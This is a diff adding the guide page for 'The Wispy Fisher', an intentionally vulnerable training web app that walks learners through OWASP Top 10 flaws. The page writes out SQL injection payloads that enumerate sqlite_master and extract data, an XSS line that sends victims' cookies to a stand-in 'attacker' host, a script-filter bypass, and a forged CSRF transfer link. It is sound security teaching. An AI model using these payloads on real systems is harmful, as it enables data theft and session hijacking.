@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+  <style>
+  body,h1,h2,h3,h4,h5,h6 {font-family: "Lato", sans-serif}
+  .w3-bar,h1,button {font-family: "Montserrat", sans-serif}
+  p {font-size: 20px}
+  </style>
+</head>
+<body>
+  <header class="w3-container w3-teal">
+    <h1>The Wispy Fisher Guide</h1>
+  </header>
+  <div class="w3-container" style="padding: 0px 150px;">
+    <div class="w3-container">
+      <h3 class="w3-border-bottom w3-jumbo">The Wispy Fisher</h3>
+      <p>The Wispy Fisher is an intentionally vulnerable web application. This project aims to provide a realistic presentation of vulnerabilities commonly found
+        in web applications. The weaknesses were chosen based off of the <a class="w3-text-red" href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" style="text-decoration:none;" target="_blank">Owasp Top 10</a>.
+        This choice was made as this list is compiled from a consensus on the most common and severe vulnerabilities found in web applications. Through the exploitation
+        of these vulnerabilities in a realistic environment it is possible to achieve a better understanding of how they occur and thus how they can be mitigated.
+      </p>
+    </div>
+    <div class="w3-container">
+      <h3 class="w3-border-bottom w3-xxlarge">Using The Project</h3>
+      <p>
+        This project involves two pieces, this guide, and The Wispy Fisher website. The website is built to look for the most part like a real production website for a company that sells fly fishing gear. It does, however,
+        contain vulnerabilities  from all the classes introduced below. This guide is meant to be used alongside the website as a tool that introduces all the vulnerability classes and how they may arise on the site. It is recommended
+        first to read the contents of this guide and perhaps some of the resources referenced in it. Once you have a conceptual grasp of the vulnerabilities, then go to the site and put this into practice. Before attempting to
+        exploit anything it is a good idea to get a sense of the site and all its functionality, so it is recommended to make an account login and explore the site. Once you have an idea of all the features, you should pick a
+        vulnerability class to try to find and exploit.
+      </p>
+      <h3 class="w3-xlarge">Hints</h3>
+      <p>
+        If you get stuck searching for a particular vulnerability, you can use the <img class="w3-padding" src="/images/guide/hint.png"> button to receive hints about how to find and exploit it. The hints get progressively closer to the solution so use them only as they are needed.
+        If after using all the clues you still are not able to find the vulnerability use the link to go back to the guide and make sure you are not missing anything. Lastly, you can resort to looking at the solution. These solutions are just showing one way to exploit the
+        vulnerability they are however by no means the only way. This project gives you the ability to explore alternative methods in a safe contained environment.
+      </p>
+      <h3 class="w3-xlarge">Restart</h3>
+      <p>Should you at any point while using the website find that after exploiting a vulnerability the site is no longer functioning correctly simply restart the program. Every time you reboot the system, the database will be cleaned and reset.
+        This means that you will lose any accounts you have created, but the system should function normally again.
+      </p>
+    </div>
+    <div class="w3-container">
+      <h3 class="w3-border-bottom w3-xxlarge">Prerequisite Knowledge</h3>
+      <p>
+        Although this project was built with a beginner in mind, there is still a baseline of knowledge necessary to understand the vulnerabilities and how to exploit them on the site.
+        Before starting it is recommended to have a basic understanding of HTML and JavaScript. It is not expected to have in-depth knowledge but being able to understand the source code of the
+        web pages is essentail. An excellent resource for learning HTML can be found <a href="https://www.w3schools.com/html/" class="w3-text-red" style="text-decoration:none;" target="_blank">here</a> and for JavaScript
+        <a href="https://www.w3schools.com/js/default.asp" class="w3-text-red" style="text-decoration:none;" target="_blank">here</a>. Furthermore, it will help to have a working understanding of <a href="https://www.w3schools.com/jquery/" class="w3-text-red" style="text-decoration:none;" target="_blank">jQuery</a> as this is used in the frontend of the
+        site. Again, one does not need to be an expert in any of these; it is just important to understand the basics. The vulnerability sections introduce further resources, but basic knowledge of these web development languages is all
+        that is necessary to exploit the majority of the vulnerabilities.
+      </p>
+    </div>
+    <div class="w3-container">
+      <h3 class="w3-border-bottom w3-xxlarge">Tools</h3>
+      <p>The only tool required to exploit the vulnerabilities on the site is the browser.</p>
+      <h3 class="w3-xlarge">Browser</h3>
+      <p>
+        The most important feature of the browser for finding the vulnerabilities is the inspection tool. This development functionality can be located on both Google Chrome or Mozilla
+        Firefox by right-clicking the page and selecting <i>Inspect</i> in Chrome or <i>Inspect Element</i> in Firefox. The inspection tool can be used to look at the page's HTML and scripts.
+      </p>
+      <img class="w3-padding" src="/images/guide/elements.png" style="width:100%">
+      <p> Furthermore, this tool can be used to view the cookies in your browser.</p>
+      <img class="w3-padding" src="/images/guide/cookies.png" style="width:100%">
+      <p>Another, technique for checking the page's source code is to right-click and select the <i>View Page Source</i> option, this can be done on both browsers.</p>
+      <img class="w3-padding" src="/images/guide/page_source.jpg" style="width:100%">
+      <p>The console window can be used to monitor any JavaScript errors and to manipulate the browser's cookies. To set a cookie's value navigate to the console  window
+        and use the following JavaScript: document.cookie="<i>cookie's name</i>=<i>desired value</i>" then hit enter you can always verify that you were successful by rechecking in the Application window.
+      </p>
+      <img class="w3-padding" src="/images/guide/console.png" style="width:100%">
+    </div>
+    <div class="w3-container">
+      <h3 class="w3-border-bottom w3-xxlarge">Injection</h3>
+      <p>Injection vulnerabilities occur when a user can send code straight to an interpreter by placing the code into a program command or query.
+      The code can be used to manipulate the interpreter into executing unwanted system commands or making changes to a critical database. The impact of such a vulnerability
+      can range from data loss and manipulation to a fully compromised system. One of the most common injection vulnerabilities is SQL Injection.
+      <h4 class="w3-large" id="injection"><b>SQL Injection</b></h4>
+      <p>Structured Query Language or SQL is a language used to communicate with relational databases. SQL databases are commonly used in the backend of web applications to
+      store user and product data. If user-supplied data is used in any of the SQL queries made to these databases without first being sanitized of any malicious content, then the application may be vulnerable to SQL injection.
+      Common injection points in an application include logins, searches, and any time user data is changed or requested. To understand how this type of attack works it is essential
+      to have an understanding of the SQL language. Teaching the language is beyond the scope of this project, but you can find a good resource <a target="_blank" class="w3-text-red" href="https://www.w3schools.com/sql/" style="text-decoration:none;">
+      here</a>.</p>
+      <p>For this explanation we will consider a search function on a website used to search for users based on their username. The SQL query attached to this functionality
+      would look something like <br> <span class="w3-text-blue">SELECT * FROM Users WHERE Username='<<i>search paramater</i>>'</span><br> If the search parameter entered by the user is not sanitized, then this query is vulnerable.
+      We can test to see if it is vulnerable by entering some SQL as the search parameter that always evaluates to true like <span class="w3-text-red"><i>' OR '1'='1</i></span> let us check this with the SQL query.<br>
+      <span class="w3-text-blue">SELECT * FROM Users WHERE Username='<span class="w3-text-red">' OR '1'='1</span>'</span><br> We can see that the first single quote ends the username string and <i>OR 1=1</i> is a condition
+      that will always evaluate to true. If this search parameter executes without any error, the attacker knows that the search function is likelily vulnerable to SQL injection. Once this is determined
+      an attacker can work on developing a more effective payload to be entered in the search function. The goal of a more effective payload is to extract information from other tables on
+      the database. For instance, an attacker may wish to procure a user's passwords or personal information so that they can impersonate or solicitate from them. To achieve this,
+      an attacker will use a <span class="w3-text-red">UNION SELECT</span> statement to append another SQL query to the injectable one. However, the attacker first has to determine how many columns
+      are being returned by the original query because their new SELECT statement must have the same number in order to execute. This can be done using an ORDER BY statement, using the previous example
+      <br><span class="w3-text-blue">SELECT * FROM Users WHERE Username='<span class="w3-text-red">1' ORDER BY 5 --</span>'</span><br> It is important to note that the "--" is commenting out the last single quote. If the query is returning 5 columns, then it will execute if it does
+      not execute the attacker knows to decrement the ORDER BY value. The attacker now needs to determine which column to inject into Let us say that the query is, in fact, returning 5
+      columns the attacker then uses a payload <span class="w3-text-red">1' UNION SELECT 1,2,3,4,5 --</span> to append a new row to the query making the query
+      <br><span class="w3-text-blue">SELECT * FROM Users WHERE Username='<span class="w3-text-red">1' UNION SELECT 1,2,3,4,5 --</span>'</span><br> Now the attacker can see which of the numbers
+      is displayed on the page. Whichever number it is, is the column they can inject into. For our example, we will say it is column 2. Now all that is left is to determine the other tables on the
+      database. Which is done by querying a database specific table that holds this information. In a SQLite database, this information is held in the sqlite_master
+      table. Therefore, the payload would look like <br><span class="w3-text-blue">SELECT * FROM Users WHERE Username='<span class="w3-text-red">1' UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE TYPE="table" --</span>'</span><br>
+      An attacker now knows all the tables in the database and can then pick one to infiltrate. To extract data from the chosen table the attacker must determine the column names of the selected table which can be done again by querying the sqlite_master
+      table with a payload like <br><span class="w3-text-blue">SELECT * FROM Users WHERE Username='<span class="w3-text-red">1' UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE tbl_name="<i>the selected table</i>" TYPE="table" --</span>'</span><br>
+      With this information, it is then just a matter of querying the table for any data the attacker wants to know.
+      </p>
+      <h4 class="w3-large"><b>Read More</b></h4>
+      <a href="https://resources.infosecinstitute.com/best-free-and-open-source-sql-injection-tools/#gref" class="w3-text-blue" style="text-decoration:none" target="_blank">SQL Injection Tools</a><br>
+      <a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" class="w3-text-blue" style="text-decoration:none" target="_blank">Cheat Sheet</a><br>
+      <a href="https://www.rapid7.com/fundamentals/sql-injection-attacks/" class="w3-text-blue" style="text-decoration:none" target="_blank">Different Types of SQL Injection</a>
+    </div>
+    <div class="w3-container">
+      <h3 class="w3-border-bottom w3-xxlarge">Broken Authentication</h3>
+      <p>Broken authentication vulnerabilities occur when the method of authentication used by the web application is not implemented correctly. For example, session tokens stored
+       as cookies are often used to track the identity of a user on a web application. However, if these tokens are implemented in an insecure manner an attacker could
+       manipulate them to take on the identity of another user. Authentication vulnerabilities can also happen if an attacker can get access to another users password
+       or personal identifiers. The impact of these vulnerabilities can be severe if, for example, an attacker manages to impersonate an administrative user they could gain complete
+       control of the application.</p>
+       <h4 class="w3-large" id="brokenAuth"><b>Weak Session Tokens</b></h4>
+       <p>Session IDs are a standard way of identifying users in a web application. However, if an attacker can determine how these session tokens are created, they may be able to
+        develop and use the session ID of another user. Identifying how the tokens are created often involves making a couple of different accounts and recording the session tokens for
+        these accounts. The tokens are often found stored as cookies on the browser. After the attacker has a selection of IDs, they can then look for patterns that point to how they were created.
+        If the session tokens are not in plain text, they are often encoded using an encoding algorithm like base64. If the attacker can identify a pattern in the tokens, like for instance
+        they are made using a combination of a user's username and a time stamp or some specific key, the attacker can begin to generate the tokens for other users.
+      </p>
+      <h4 class="w3-large"><b>Read More</b></h4>
+      <a href="https://hdivsecurity.com/owasp-broken-authentication-and-session-management" class="w3-text-blue" style="text-decoration:none;" target="_blank">More Examples</a><br>
+      <a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" class="w3-text-blue" style="text-decoration:none;" target="_blank">Vulnerabilities In JSON Web Tokens</a>
+    </div>
+    <div class="w3-container" id="sensitive">
+      <h3 class="w3-border-bottom w3-xxlarge">Sensitive Data Exposure</h3>
+      <p>The exposure of sensitive data can take many forms but is essentially the ability for a malicious user to view any data that they were not intended to see. This data
+      could be other user's personal, financial, or medical information as well as any sensitive information about the web application or its owner. It
+      is vital that any personal data stored by the application is encrypted. Encryption is important because if an attacker can gain access to the data, then they
+      will not be able to determine any of the actual values. Another common data exposure is leaving confidential data stored alongside data presented to the users of an application.
+      For example, if a file is made available to a user as part of the application it is important to remove all sensitive data in the same directory as an attacker would
+      likely check any such directory for additional content.
+      </p>
+      <h4 class="w3-large"><b>Read More</b></h4>
+      <a href="https://blog.detectify.com/2016/07/01/owasp-top-10-sensitive-data-exposure-6/" class="w3-text-blue" style="text-decoration:none;" target="_blank">More Examples</a><br>
+      <a href="https://www.hackingarticles.in/5-ways-directory-bruteforcing-web-server/" class="w3-text-blue" style="text-decoration:none;" target="_blank">Directory Bruteforcing</a>
+    </div>
+    <div class="w3-container">
+      <h3 class="w3-border-bottom w3-xxlarge">Broken Access Control</h3>
+      <p>Broken access control vulnerabilities occur when an authenticated user can access functionality or perform an action that they should not be able to. This
+        often means an attacker can perform an action that negatively affects another user. A common manifestation of these vulnerabilities is an
+        Insecure Direct Object Reference or IDOR.</p>
+        <h4 class="w3-large" id="idor"><b>IDOR</b></h4>
+      <p>If we consider objects in a web application like users or documents, then IDs are often used to identify objects when accessing, changing, or deleting them. An example of this is an ID for a user
+         that is used to identify them in the process of changing their payment details or password. The vulnerability then arises if an attacker can change such an ID to affect
+         another user or gain access to something they should not be able to. Like if an application returns a user's documents based on an ID sent in the URL and does not verify that the requesting user
+         owns the documents. An attacker could then change their ID in the request to the ID of another user and would then receive that user's data. IDORs are often found in URLs but are also found
+         in request bodies, headers, and cookies. They may look like <i>id=</i> then some number or can even be just a number. To test for this vulnerability walkthrough the application
+         and any time you come across a number try to increment or decrement it and observe the effect. Bear in mind that sometimes these values are encoded using an algorithm like base64 so if you see
+         something that looks encoded it is often worth using an online decoder to check its value.
+      </p>
+      <h4 class="w3-large"><b>Read More</b></h4>
+      <a href="https://zseano.com/tutorials/2.html" class="w3-text-blue" style="text-decoration:none;" target="_blank">More on IDORs</a><br>
+      <a href="https://www.bugcrowd.com/resource/broken-access-control-testing/" class="w3-text-blue" style="text-decoration:none;" target="_blank">Broken Access Control Testing</a>
+
+    </div>
+    <div class="w3-container">
+      <h3 class="w3-border-bottom w3-xxlarge">Security Misconfiguration</h3>
+      <p>Security misconfigurations cover a wide range of possible vulnerabilities. One of the most challenging things about security in web applications especially as they get bigger is
+        making sure that all the operating systems, frameworks, and libraries used, are up to date and fully patched for vulnerabilities. Often default configurations will
+        be insecure, or an error message will be too verbose and give an attacker some insight into how the web application operates. Furthermore, the server may not be configured to
+        send the proper security headers in its responses.</p>
+        <h4 class="w3-large" id="secMis"><b>Verbose Error Messages</b></h4>
+      <p>When designing web applications developers will often use informative error messages to help with debugging. However, when the application goes from development into production,
+        these overly verbose error messages can sometimes be overlooked and thus not removed. If an attacker can trigger such a message they may be able to get a glimpse into how the
+        application works or a particular library or component in the code base. This information can be dangerous as it may allow the attacker to exploit a feature that they would not
+        otherwise know about or use it as the bases for a higher impact attack like SQL injection.
+      </p>
+      <h4 class="w3-large"><b>Read More</b></h4>
+      <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration" class="w3-text-blue" style="text-decoration:none;" target="_blank">OWASP Description</a>
+    </div>
+    <div class="w3-container" id="XSS">
+      <h3 class="w3-border-bottom w3-xxlarge">Cross Site Scripting (XSS)</h3>
+      <p>XXS occurs when a web application uses data that an attacker can manipulate or provides without properly sanitizing it for malicious content. XXS vulnerabilities allow an attacker
+        to execute JavaScript in a victims browser. Thus, giving the attacker the ability to steal session data or even redirect users to a malicious site and perhaps install malware. Two common
+        forms of XSS are reflected and persistent.</p>
+        <h4 class="w3-large"><b>Reflected</b></h4>
+        <p>Reflected XSS occurs when the payload originates from the victim's request. To make this work, an attacker must trick them into executing a crafted request to the vulnerable
+          web application. The payload is then reflected back to the victim causing the JavaScript to execute in their browser. This attack could start with a phishing email sent to the
+          victim containing a malicious request like <br>
+          <span class="w3-text-blue">GET http://website/search/keyword?=</span><span class="w3-text-red">&ltscript&gtwindow.location='http://attacker/?cookie='+document.cookie&lt/script&gt</span> <br>
+          The blue section is the valid request to the vulnerable site, and the red section is the malicious payload which would direct the victim to the attacker's site with their cookies passed in
+          the request query. The attacker is then able to use these cookies to impersonate the victim on the website.
+        </p>
+        <h4 class="w3-large"><b>Persistent</b></h4>
+        <p>Persistent XSS happens when an attacker can save a malicious script like the one outlined above in a web applications database. The code is then saved in the application and has the
+           possibility of affecting multiple users. A good example of this is a website with a vulnerable comment function. If an attacker then comments a malicious script, this is saved, and
+           any user who views the attacker's comment triggers the script.
+        </p>
+        <h4 class="w3-large"><b>Exploiting</b></h4>
+        <p>Testing for persistent and reflected XSS vulnerabilities involves looking for places in the application where user input is returned in the page and once you have identified a place where
+          this happens look at the page's source code to determine the HTML element that contains the input. For example, if a search query is saved in a paragraph element like
+          <span class="w3-text-green">&ltp&gt<i>user-query</i>&lt/p&gt</span>, it is possible this is vulnerable. To test if this feature is vulnerable a payload like
+          <span class="w3-text-red">&lt/p&gt&ltscript&gtalert("XSS")&lt/script&gt</span> could be used. If an alert window pops up with "XSS" displayed in it you know the application
+          is vulnerable because it is executing the script. This works because when the payload is entered into the HTML it forms
+          <span class="w3-text-green">&ltp&gt</span><span class="w3-text-red">&lt/p&gt&ltscript&gtalert("XSS")&lt/script&gt</span> closing off the paragraph element and inserting
+          a script block into the HTML which will execute when the page renders. Often web applications will have some sort of filter or blacklist for input that is not allowed and
+          getting an XSS payload to execute can be difficult. For instance, the application may check user input for any instances of "script" and disallow the input if it finds any. However,
+          this is bypassed by using a new payload like <span class="w3-text-red">&ltimg src="x" onerror=alert("XSS")&gt</span> which loads a malformed image that will trigger the onerror alert.
+        </p>
+        <h4 class="w3-large"><b>Read More</b></h4>
+        <a href="https://zseano.com/tutorials/4.html" class="w3-text-blue" style="text-decoration:none;" target="_blank">XSS Tutorial</a><br>
+        <a href="http://brutelogic.com.br/blog/" class="w3-text-blue" style="text-decoration:none;" target="_blank">Great Blog Devoted To XSS</a>
+    </div>
+    <div class="w3-container" id="deserialization">
+      <h3 class="w3-border-bottom w3-xxlarge">Insecure Deserialization</h3>
+      <p>Serializing in the case of web applications is the process of translating data into a transferable format. This could, for example, involve packaging user details together and
+        sending them from the server to the frontend of the application. Deserialization is just the undoing of this process by taking the formatted data and separating it back out into its
+        original form. However, if this process is not done securely, an attacker could get the server to execute some malicious commands. The impact of this can be quite severe
+        depending on what commands the attacker can get the server to run.
+      </p>
+      <p>Deserialization attacks can happen if an attacker can figure out how the data is serialized. For instance, if an attacker can identify a library used by the
+        application to serialize data, they can use the same library to serialize a payload and pass this to the application. Often applications will use such libraries to create
+        session tokens by combining user data. When looking for these vulnerabilities, it is important to think about what may have been packaged together for easy transportation. For
+        instance, a session token would be a common place to serialize user information. Furthermore, it is highly recommended to read the resources
+        provided in the Read More section as these are an excellent example of how this vulnerability manifests in a node application.
+      </p>
+      <h4 class="w3-large"><b>Read More</b></h4>
+      <a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/" class="w3-text-blue" style="text-decoration:none;" target="_blank">Nodejs Exploit Walkthrough</a><br>
+      <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf" class="w3-text-blue" style="text-decoration:none;" target="_blank">Java Deserialization Apocalypse</a>
+    </div>
+    <div class="w3-container">
+      <h3 class="w3-border-bottom w3-xxlarge">Using Component With Known Vulnerabilities</h3>
+      <p>As modern web applications get bigger and bigger so too does the number of libraries, frameworks, and software modules used. This growth is both good and bad. It is good because it has become much
+        easier to make large, complicated applications rich with features without having to code every line. However, with this comes the problem that one of the components used could
+        contain a vulnerability that the web application developer is not aware of but because it is in their code base it gives an attacker the ability to exploit it and thus
+        the application. A perfect example of this is the serialization library introduced in the <b>Read More</b> section of the insecure deserialization vulnerability class.
+      </p>
+      <h4 class="w3-large"><b>Read More</b></h4>
+      <a href="https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c" class="w3-text-blue" style="text-decoration:none;" target="_blank">Exploit Effecting Hundreds of Companies Through Their Support Desk </a>
+    </div>
+    <div class="w3-container" id="csrf">
+      <h3 class="w3-border-bottom w3-xxlarge">Cross Site Request Forgery (CSRF)</h3>
+      <p>CSRF vulnerabilities occur when an attacker can trick an authenticated user into performing an unintended action. An attacker often employs some form of social engineering
+        to get a user to perform an action of their choosing like clicking on a link. As an example, consider a bank website the facilitates the transfer of funds between its users. A request to transfer funds could look
+        like <span class="w3-text-blue">GET http://bank/transfer?to=SomeUser&amount=1000</span> an attacker could take this request and hide it in some way that would trick a bank user into
+        sending them money like <span class="w3-text-red">&lta href="<span class="w3-text-blue">GET http://bank/transfer?to=Attacker&amount=1000</span>"&gtRead this!&lt/a&gt</span>. Attempts to
+        mitigate this attack involve including a random token in such requests called a CSRF token. The token prevents the attack because the attacker is not able to anticipate the value of the token
+        and thus cannot include it in their payload. However, these tokens are often implemented in an insecure way; for example, only the length of the token is checked by the server, or in more
+        extreme cases the token is not checked at all. Testing for CSRF vulnerabilities involes searching for critical state changing functionality like changing account details or making a purchase and if
+        there is no preventative measures in place like a token then the application is vulnerable. Furthermore, if there is an implementation in place for preventing this, check that it is implemented correctly
+        by modifying the token to see if it is properly verified.
+      </p>
+      <h4 class="w3-large"><b>Read More</b></h4>
+      <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)" class="w3-text-blue" style="text-decoration:none;" target="_blank">OWASP Description</a><br>
+      <a href="https://www.pentestpartners.com/security-blog/how-to-exploit-xss-with-csrf/" class="w3-text-blue" style="text-decoration:none;" target="_blank">CSRF to XSS</a>
+
+    </div>
+    <div class="w3-container">
+      <h3 class="w3-border-bottom w3-xxlarge">Insufficient Logging and Monitoring</h3>
+      <p>Even though logging and monitoring cannot be visually exploited in this project it is a vital aspect of web security. It is crucial to detecting attacks and responding productively.
+        Malicious hackers rely on the ability to stay under the radar and exploit an application in secrecy. Furthermore, they will often need a period of reconnaissance to identify
+        exploitable functionality on the app. If this reconnaissance can be detected, it may be possible to stop a breach before it occurs. Monitoring for this involves logging failed login attempts,
+        failed input validations, and any attempts to target privileged users. It is, however, difficult to determine normal user behavior from malicious that is why this is such a widespread problem in web apps. Even large
+        web-based companies have failed to adequately establish logging and monitoring, which has lead to breaches of user data before there was any action taken on the companies behalf.
+      </p>
+      <h4 class="w3-large"><b>Read More</b></h4>
+      <a href="https://blog.detectify.com/2018/04/06/owasp-top-10-insufficient-logging-monitoring/" class="w3-text-blue" style="text-decoration:none;" target="_blank">Further Explanation</a>
+    </div>
+    <div class="w3-container w3-padding-large">
+      <a class="w3-button w3-round w3-jumbo w3-green" href="/storefront" style="width:100%"> Go To The site</a>
+    </div>
+    <div class="w3-container w3-padding">
+      <h3 class="w3-border-bottom w3-xxlarge">Solutions</h3>
+      <a href="/solutions/login-xss">Login XSS</a><br>
+      <a href="/solutions/login-injection">Login SQL Injection</a><br>
+      <a href="/solutions/password-idor">Changing Password IDOR</a><br>
+      <a href="/solutions/user-csrf">Changing Username CSRF</a><br>
+      <a href="/solutions/weak-session">Weak Session Token</a><br>
+      <a href="/solutions/deserialization">Insecure Deserialization Remote Code Execution</a><br>
+      <a href="/solutions/product-xss">Product Page XSS</a><br>
+      <a href="/solutions/product-csrf">Product Page CSRF</a><br>
+      <a href="/solutions/contact-xss">Contact Page XSS</a><br>
+      <a href="/solutions/course-exposure">Course Page Data Exposure</a><br>
+      <a href="/solutions/shop-error">Shop Page Error</a><br>
+      <a href="/solutions/search-injection">Search SQL Injection</a>
+    </div>
+  </div>
+</body>
+</html>
